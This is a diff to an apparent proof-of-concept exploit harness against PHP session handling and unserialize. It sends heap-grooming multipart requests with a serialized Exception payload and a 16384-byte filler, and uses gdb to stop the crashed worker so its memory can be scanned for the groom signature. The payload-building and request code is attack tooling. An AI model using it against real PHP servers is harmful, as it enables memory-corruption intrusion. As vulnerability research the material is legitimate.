@@ -87,8 +87,8 @@ def main():
         script = f"""set pagination off
 break *0x{bp:x}
 continue
-echo ===BP-HIT===\n
-continue
+echo ===BP-DESTROY===\n
+shell sleep 600
 """
     else:
         script = f"""set pagination off
@@ -112,7 +112,7 @@ quit
     time.sleep(0.3)
     payload = build_payload(dval, daddr, bias)
     stage(sid_b, b"poc|i:1;" if mode == "benign" else b'poc|O:9:"Exception":0:{}')
-    comb = b"F" * FILL + payload
+    comb = b"F" * 16384 + payload
     cons = pb([part(b"g", comb),
                part(b"PHPSESSID", sid_b.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
@@ -124,9 +124,8 @@ quit
     s.close()
 
     if mode == "benign":
-        # gdb is stopped at php_var_unserialize_destroy (or waiting);
-        # scan ALL rw regions of the stopped child for the groom sig.
-        time.sleep(1)
+        # gdb holds the child at SIGSEGV; scan ALL rw regions now.
+        time.sleep(2)
         hits = []
         with open(f"/proc/{tgt_host}/maps") as f:
             maps = f.read().splitlines()
@@ -155,7 +154,7 @@ quit
                     i = j + 1
         for h in hits:
             log(f"SIG-HIT: {h[0]} ({h[1]}) chunkrel={h[0]}")
-        gdb.kill()
+        gdb.kill()  # detach-and-kill: releases the stopped child
         out, _ = gdb.communicate()
         for h in others:
             os.kill(h, signal.SIGCONT)
